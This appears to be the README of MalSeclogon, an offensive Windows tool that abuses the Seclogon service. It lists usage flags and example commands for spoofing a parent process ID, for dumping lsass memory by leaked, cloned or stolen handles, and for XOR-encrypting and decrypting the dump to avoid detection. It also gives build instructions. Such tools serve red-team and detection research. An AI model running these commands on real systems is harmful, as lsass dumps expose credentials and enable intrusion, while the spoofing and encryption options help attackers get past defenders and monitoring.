# MalSeclogon
A little tool to play with the Seclogon service.

Full technical details at:
- https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html
- https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-3.html

## Usage
```
        MalSeclogon v0.2
        @splinter_code

Args:
-p Pid of the process to spoof the PPID through seclogon service
-d Dump lsass method
        1 = Dump lsass by using leaked handles
        2 = Dump lsass by using leaked handles and cloned lsass process
        3 = Dump lsass by stealing handle from seclogon. (Default)
-o Output path of the dump (default C:\lsass.dmp)
-c Commandline of the spoofed process, default: cmd.exe (not compatible with -d)
-k Xor key to encrypt the dump. Compatible only with -d 3. Allowed values 1-255. Default = 40.
-f Path to an encrypted dump file. This decrypt the dump. If no -k key are specified the default value is 40.

Examples:
- Run a process with a spoofed PPID:
        Malseclogon.exe -p [PPID] -c cmd.exe
- Dump lsass by using leaked handles:
        Malseclogon.exe -d 1
- Dump lsass by using leaked handles and cloned lsass process:
        Malseclogon.exe -d 2
- Dump lsass by stealing handle from seclogon using xor key 40:
        Malseclogon.exe -d 3 -o C:\lsass.dmp.xor -k 40
- Decrypt an lsass dmp file with the key 40:
        Malseclogon.exe -f C:\lsass.dmp.xor -k 40

```

## Build instructions
Do not build "Debug" or "x86" releases. The compiled binary won't work if using these builds.
The right build to use is "Release x64".
